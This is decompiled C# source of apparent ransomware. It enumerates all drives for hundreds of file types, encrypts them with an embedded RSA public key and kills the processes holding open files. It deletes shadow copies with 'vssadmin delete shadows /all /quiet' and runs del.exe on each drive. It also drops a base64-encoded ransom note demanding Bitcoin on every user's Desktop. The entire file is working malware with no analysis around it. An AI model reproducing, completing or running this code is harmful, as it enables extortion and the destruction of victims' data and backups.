using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using ns1;

namespace ns2;

internal sealed class Class2
{
	[CompilerGenerated]
	internal sealed class Class3
	{
		public string string_0;

		internal bool method_0(string string_1)
		{
			return string_1 == string_0.ToLower();
		}
	}

	internal static string[] string_0 = new string[345]
	{
		".jin", ".xls", ".xlsx", ".pdf", ".doc", ".docx", ".ppt", ".pptx", ".log", ".txt",
		".gif", ".png", ".conf", ".data", ".dat", ".dwg", ".asp", ".aspx", ".html", ".tif",
		".htm", ".php", ".jpg", ".jsp", ".js", ".cnf", ".cs", ".vb", ".vbs", ".mdb",
		".mdf", ".bak", ".bkf", ".java", ".jar", ".war", ".pem", ".pfx", ".rtf", ".pst",
		".dbx", ".mp3", ".mp4", ".mpg", ".bin", ".nvram", ".vmdk", ".vmsd", ".vmx", ".vmxf",
		".vmsn", ".vmem", ".gz", ".3dm", ".3ds", ".zip", ".rar", ".3fr", ".3g2", ".3gp",
		".3pr", ".7z", ".ab4", ".accdb", ".accde", ".accdr", ".accdt", ".ach", ".acr", ".act",
		".adb", ".ads", ".agdl", ".ai", ".ait", ".al", ".apj", ".arw", ".asf", ".asm",
		".asx", ".avi", ".awg", ".back", ".backup", ".backupdb", ".pbl", ".bank", ".bay", ".bdb",
		".bgt", ".bik", ".bkp", ".blend", ".bpw", ".c", ".cdf", ".cab", ".chm", ".cdr",
		".cdr3", ".cdr4", ".cdr5", ".cdr6", ".cdrw", ".cdx", ".ce1", ".ce2", ".cer", ".cfp",
		".cgm", ".cib", ".class", ".cls", ".cmt", ".cpi", ".cpp", ".cr2", ".craw", ".crt",
		".crw", ".csh", ".csl", ".csv", ".dac", ".db", ".db3", ".dbf", ".db-journal", ".dc2",
		".dcr", ".dcs", ".ddd", ".ddoc", ".ddrw", ".dds", ".der", ".des", ".design", ".dgc",
		".djvu", ".dng", ".dot", ".docm", ".dotm", ".dotx", ".drf", ".drw", ".dtd", ".dxb",
		".dxf", ".jse", ".dxg", ".eml", ".eps", ".erbsql", ".erf", ".exf", ".fdb", ".ffd",
		".fff", ".fh", ".fmb", ".fhd", ".fla", ".flac", ".flv", ".fpx", ".fxg", ".gray",
		".grey", ".gry", ".h", ".hbk", ".hpp", ".ibank", ".ibd", ".ibz", ".idx", ".iif",
		".iiq", ".incpas", ".indd", ".jpe", ".jpeg", ".kc2", ".kdbx", ".kdc", ".key", ".kpdx",
		".lua", ".m", ".m4v", ".max", ".mdc", ".mef", ".mfw", ".mmw", ".moneywell", ".mos",
		".mov", ".mrw", ".msg", ".myd", ".nd", ".ndd", ".nef", ".nk2", ".nop", ".nrw",
		".ns2", ".ns3", ".ns4", ".nsd", ".nsf", ".nsg", ".nsh", ".nwb", ".nx2", ".nxl",
		".nyf", ".oab", ".obj", ".odb", ".odc", ".odf", ".odg", ".odm", ".odp", ".ods",
		".odt", ".oil", ".orf", ".ost", ".otg", ".oth", ".otp", ".ots", ".ott", ".p12",
		".p7b", ".p7c", ".pab", ".pages", ".pas", ".pat", ".pcd", ".pct", ".pdb", ".pdd",
		".pef", ".pl", ".plc", ".pot", ".potm", ".potx", ".ppam", ".pps", ".ppsm", ".ppsx",
		".pptm", ".prf", ".ps", ".psafe3", ".psd", ".pspimage", ".ptx", ".py", ".qba", ".qbb",
		".qbm", ".qbr", ".qbw", ".qbx", ".qby", ".r3d", ".raf", ".rat", ".raw", ".rdb",
		".rm", ".rw2", ".rwl", ".rwz", ".s3db", ".sas7bdat", ".say", ".sd0", ".sda", ".sdf",
		".sldm", ".sldx", ".sql", ".sqlite", ".sqlite3", ".sqlitedb", ".sr2", ".srf", ".srt", ".srw",
		".st4", ".st5", ".st6", ".st7", ".st8", ".std", ".sti", ".stw", ".stx", ".svg",
		".swf", ".sxc", ".sxd", ".sxg", ".sxi", ".sxi", ".sxm", ".sxw", ".tex", ".tga",
		".thm", ".tlg", ".vob", ".wallet", ".wav", ".wb2", ".wmv", ".wpd", ".wps", ".x11",
		".x3f", ".xis", ".xla", ".xlam", ".xlk", ".xlm", ".xlr", ".xlsb", ".xlsm", ".xlt",
		".xltm", ".xltx", ".xlw", ".ycbcra", ".yuv"
	};

	internal static List<string> list_0 = new List<string>();

	private static List<string> list_1 = new List<string>();

	internal static string string_1 = "<RSAKeyValue><Modulus>s++X1THGe7APcrExG48C1MdhOt9BHfwprdneaYc3fgEFQGV0/9B0jEvHu6y31htbZ6TIjQqJ292k8c0mbWtTob3vRxuSrtUPhZGFH/joQ0HUl2v4IbC1J3awKXCghPSIodiQkfp5kYhhgGx06I9QPojmEsR31X9dpe15tLD0jYTPyBJD/ufCvxTdmbpd0SzqGxzL580FrCg5wKqcC3BJD7pFHsh8WVIyqQd0LUz6OCOSGMsREXNCuGoe2ZMXnCUvy97XyVODjbcAuUw/pllJHLKPydaMwl89oRzy/GeO6h9BXDENkxm2EcxooadldSqVlSCWdNjjSXSU1AKMlP5OQQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	internal static string string_2 = Directory.GetCurrentDirectory();

	internal static string string_3 = "HELP_DECRYPT_YOUR_FILES";

	internal static string string_4 = ".txt";

	internal static string string_5 = string_2 + "\\selfdel.exe";

	internal static string string_6 = ".encryptedRSA";

	internal static string string_7 = "I1doYXQgaGFwcGVuZWQgdG8geW91ciBmaWxlcz8KCkFsbCBvZiB5b3VyIGltcG9ydGFudCBmaWxlcyBlbmNyeXB0ZWQgd2l0aCBSU0EtMjA0OCwgUlNBLTIwNDggaXMgYSBwb3dlcmZ1bCBjcnlwdG9ncmFwaHkgYWxnb3JpdGhtCkZvciBtb3JlIGluZm9ybWF0aW9uIHlvdSBjYW4gdXNlIFdpa2lwZWRpYQoqYXR0ZW50aW9uOiBEb24ndCByZW5hbWUgb3IgZWRpdCBlbmNyeXB0ZWQgZmlsZXMgYmVjYXVzZSBpdCB3aWxsIGJlIGltcG9zc2libGUgdG8gZGVjcnlwdCB5b3VyIGZpbGVzCgojSG93IHRvIHJlY292ZXIgZmlsZXM/CgpSU0EgaXMgYSBhc3ltbWV0cmljIGNyeXB0b2dyYXBoaWMgYWxnb3JpdGhtLCBZb3UgbmVlZCB0d28ga2V5CgoxLVB1YmxpYyBrZXk6IHlvdSBuZWVkIGl0IGZvciBlbmNyeXB0aW9uCjItUHJpdmF0ZSBLZXk6IHlvdSBuZWVkIGl0IGZvciBkZWNyeXB0aW9uCgpTbyB5b3UgbmVlZCBQcml2YXRlIGtleSB0byByZWNvdmVyIHlvdXIgZmlsZXMsIApBbGwgb2YgeW91ciBuZXR3b3JrIGNvbXB1dGVycyBmaWxlcyBpcyBlbmNyeXB0ZWQgd2l0aCBvbmUgcHVibGljIGtleSwgU28geW91IG5lZWQganVzdCBvbmUgUHJpdmF0ZSBrZXkgdG8gcmVjb3ZlciBhbGwgY29tcHV0ZXJzIGZpbGVzClRoZSBwcml2YXRlIEtleSB0aGF0IHdlIHdpbGwgc2VuZCB3b3JrcyBvbiBhbGwgeW91ciBjb21wdXRlcnMKCiNIb3cgdG8gZ2V0IHByaXZhdGUga2V5PwoKSXQncyBub3QgcG9zc2libGUgdG8gcmVjb3ZlciB5b3VyIGZpbGVzIHdpdGhvdXQgcHJpdmF0ZSBrZXksIFlvdSBtdXN0IHNlbmQgdXMgMTUsMDAwJCBVU0QgaW4gQml0Y29pbiBhYm91dCgzNyBCVEMpIHRvIHJlY2VpdmUgcHJpdmF0ZSBrZXkgRm9yIGFsbCBhZmZlY3RlZCBjb21wdXRlcnMKQWZ0ZXIgdGhhdCB3ZSBzZW5kIHlvdXIgcHJpdmF0ZSBrZXkgaW4gb3VyIGJsb2dzLgoKKk91ciBibG9nIGFkZHJlc3M6IGh0dHBzOi8vd3d3LmFub255bWUuY29tL0Jsb2cvcGF1bGNlbnN5CgoKKk91ciBCaXRjb2luIGFkZHJlc3M6MUdtanliOXdkNkp1OXBobjV0UkVtTFl3UHNQRnVzcUV4NgoKV2UgY2hlY2sgb3VyIEJpdGNvaW4gYWRkcmVzcyBldmVyeSAyIGhvdXJzIApBZnRlciB0aGF0IHdlIHJlY2VpdmUgQml0Y29pbnMgd2Ugc2VuZCB5b3VyIFByaXZhdGUgS2V5IGluIG91ciBibG9nCgojV2hhdCBpcyBCaXRjb2luPwoKQml0Y29pbiBpcyBhbiBpbm5vdmF0aXZlIHBheW1lbnQgbmV0d29yayBhbmQgYSBuZXcga2luZCBvZiBtb25leS4KWW91IGNhbiBjcmVhdGUgYSBCaXRjb2luIGFjY291bnQgYXQgaHR0cHM6Ly9ibG9ja2NoYWluLmluZm8vIGFuZCBkZXBvc2l0IHNvbWUgbW9uZXkgaW50byB5b3VyIGFjY291bnQgYW5kIHRoZW4gc2VuZCB0byB1cwoKI0hvdyB0byBidXkgQml0Y29pbj8KClRoZXJlIGFyZSBtYW55IHdheSB0byBidXkgQml0Y29pbiBhbmQgZGVwb3NpdCBpdCBpbnRvIHlvdXIgYWNjb3VudCwgCllvdSBjYW4gYnV5IGl0IHdpdGggV2VzdGVyblVuaW9uLCBCYW5rIFdpcmUsIEludGVybmF0aW9uYWwgQmFuayB0cmFuc2ZlciwgQ2FzaCBkZXBvc2l0IGFuZCBldGMKCmh0dHBzOi8vbG9jYWxiaXRjb2lucy5jb20gLS0tPiBCdXkgQml0Y29pbiB3aXRoIFdlc3Rlcm5VbmlvbiBvciBNb25leUdyYW0KCmh0dHBzOi8vY29pbmNhZmUuY29tIC0tLT4gQnV5IEJpdGNvaW4gZmFzdCBhbmQgU2VjdXJlIHdpdGggV2VzdGVyblVuaW9uIGFuZCBDYXNoIGRlcG9zaXQKCmh0dHBzOi8vd3d3LmJpdHN0YW1wLm5ldCAtLS0+IEJ1eSBCaXRjb2luIHdpdGggYmFuayB3aXJlLCBJbnRlcm5hdGlvbmFsIGJhbmsgdHJhbnNmZXIsIFNFUEEgcGF5bWVudAoKaHR0cHM6Ly93d3cua3Jha2VuLmNvbSAtLS0+IEJ1eSBCaXRjb2luIHdpdGggYmFuayB3aXJlLCBJbnRlcm5hdGlvbmFsIGJhbmsgdHJhbnNmZXIsIFNFUEEgcGF5bWVudAoKaHR0cHM6Ly93d3cua3Jha2VuLmNvbSAtLS0+IEJ1eSBCaXRjb2luIHdpdGggYmFuayB3aXJlLCBJbnRlcm5hdGlvbmFsIGJhbmsgdHJhbnNmZXIsIFNFUEEgcGF5bWVudAoKaHR0cHM6Ly93d3cuY2NlZGsuY29tIC0tLT4gQnV5IEJpdGNvaW4gd2l0aCBiYW5rIHdpcmUsIEludGVybmF0aW9uYWwgYmFuayB0cmFuc2ZlciwgU0VQQSBwYXltZW50CgpodHRwczovL2JpdGN1cmV4LmNvbS8gLS0tPiBCdXkgQml0Y29pbiB3aXRoIGJhbmsgd2lyZSwgSW50ZXJuYXRpb25hbCBiYW5rIHRyYW5zZmVyLCBTRVBBIHBheW1lbnQKCklmIHlvdSB3YW50IHRvIHBheSB3aXRoIHlvdXIgQnVzaW5lc3MgYmFuayBhY2NvdW50IHlvdSBzaG91bGQgY3JlYXRlIGEgYnVzaW5lc3MgYWNjb3VudCBpbiBleGNoYW5nZXJzIAp0aGV5IGRvbid0IGFjY2VwdCBwYXltZW50IGZyb20gdGhpcmQgcGFydHkKCiNIb3cgdG8gdXNlIHByaXZhdGUgS2V5PwoKV2Ugc2VuZCB5b3UgYSBzaW1wbGUgc29mdHdhcmUgd2l0aCBwcml2YXRlIEtleSAKQW5kIHlvdSBqdXN0IG5lZWQgcnVuIHRoaXMgc29mdHdhcmUgb24gZWFjaCBjb21wdXRlciB0aGF0IGVuY3J5cHRlZCBhbmQgYWxsIGFmZmVjdGVkIGZpbGVzIHdpbGwgYmUgZGVjcnlwdGVkCgojZGVhZGxpbmUKCllvdSBqdXN0IGhhdmUgNzIgaG91cnMgdG8gc2VuZCB1cyB0aGUgQml0Y29pbiBhZnRlciA3MiBob3VycyB3ZSB3aWxsIHJlbW92ZSB5b3VyIHByaXZhdGUga2V5IGFuZCBpdCdzIGltcG9zc2libGUgdG8gcmVjb3ZlciB5b3VyIGZpbGVz";

	private static void Main(string[] args)
	{
		if (!Class32.smethod_51())
		{
			return;
		}
		Class32.smethod_82();
		Thread.Sleep(1000);
		new Thread((ThreadStart)Class32.smethod_107).Start();
		Console.WriteLine("Search For Files");
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.IsReady)
			{
				Class32.smethod_92(driveInfo.Name);
			}
		}
		Console.WriteLine("Found " + list_0.Count);
		Class32.smethod_43("vssadmin", "delete shadows /all /quiet");
		if (list_0.Count > 0)
		{
			foreach (string item in list_0)
			{
				if (!Class32.smethod_16(item))
				{
					Class32.smethod_14(item);
				}
				else
				{
					list_1.Add(item);
				}
			}
			Console.WriteLine("Go For Open Files " + list_1.Count);
			list_0.Clear();
			if (list_1.Count > 0)
			{
				foreach (string item2 in list_1)
				{
					smethod_0(new FileInfo(item2).Name);
					Class32.smethod_14(item2);
				}
			}
		}
		try
		{
			drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo2 in drives)
			{
				if (driveInfo2.IsReady)
				{
					Class32.smethod_43(string_2 + "\\del.exe", "-c " + driveInfo2.Name.Replace("\\", "") + " /accepteula");
				}
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
		Class32.smethod_43("vssadmin", "delete shadows /all /quiet");
		smethod_1();
	}

	public static void smethod_0(string string_8)
	{
		try
		{
			string text = Class32.smethod_43("tasklist", "/v /fo csv");
			string[] separator = new string[1] { "\r\n" };
			string[] array = text.Split(separator, StringSplitOptions.None);
			List<string> list = new List<string>();
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i].Contains(string_8))
				{
					string[] array2 = array[i].Split(new char[1] { ',' });
					list.Add(array2[1].Replace("\"", ""));
				}
			}
			foreach (string item in list)
			{
				Class32.smethod_43("taskkill", "/f /pid " + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public unsafe static void smethod_1()
	{
		void* ptr = stackalloc byte[8];
		string[] directories = Directory.GetDirectories(Directory.GetParent(Environment.GetEnvironmentVariable("userprofile"))!.FullName);
		*(int*)ptr = 0;
		while (*(int*)ptr < directories.Length)
		{
			string text = directories[*(int*)ptr];
			if (Directory.Exists(text + "\\Desktop"))
			{
				try
				{
					*(int*)((byte*)ptr + 4) = 0;
					while (*(int*)((byte*)ptr + 4) < 10)
					{
						File.WriteAllText(text + "\\Desktop\\" + string_3 + "_" + *(int*)((byte*)ptr + 4) + string_4, Class32.smethod_54(string_7));
						(*(int*)((byte*)ptr + 4))++;
					}
				}
				catch (Exception)
				{
				}
			}
			(*(int*)ptr)++;
		}
	}
}
